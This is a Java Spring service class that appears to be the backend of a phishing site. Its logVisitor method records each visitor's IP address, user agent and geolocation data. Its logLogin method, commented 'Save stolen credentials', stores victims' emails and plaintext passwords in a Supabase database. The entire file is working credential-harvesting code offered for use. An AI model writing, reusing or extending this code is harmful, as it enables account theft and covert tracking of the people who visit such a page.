package com.socialguard.service;

import java.time.Instant;
import java.util.HashMap;
import java.util.Map;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Service;

@Service
public class VisitorService {

    private static final Logger log = LoggerFactory.getLogger(VisitorService.class);

    private final SupabaseService supabase;
    private final GeoService geo;

    public VisitorService(SupabaseService supabase, GeoService geo) {
        this.supabase = supabase;
        this.geo = geo;
    }

    // Log page visitor
    public void logVisitor(String ip, String userAgent) {
        try {
            GeoService.GeoResult g = geo.lookup(ip);
            Map<String, Object> row = new HashMap<>();
            row.put("ip_address", ip);
            row.put("user_agent", userAgent);
            row.put("timestamp", Instant.now().toString());
            row.put("location", g.location());
            row.put("city", g.city());
            row.put("country", g.country());
            row.put("isp", g.isp());
            supabase.insertVisitor(row);
        } catch (Exception e) {
            log.error("Error during visitor logging: {}", e.getMessage());
        }
    }

    // Save stolen credentials
    public void logLogin(String email, String password) {
        try {
            Map<String, Object> row = new HashMap<>();
            row.put("email", email);
            row.put("password", password);
            row.put("login_time", Instant.now().toString());
            supabase.insertLogin(row);
        } catch (Exception e) {
            log.error("Error sending login data to Supabase: {}", e.getMessage());
        }
    }
}
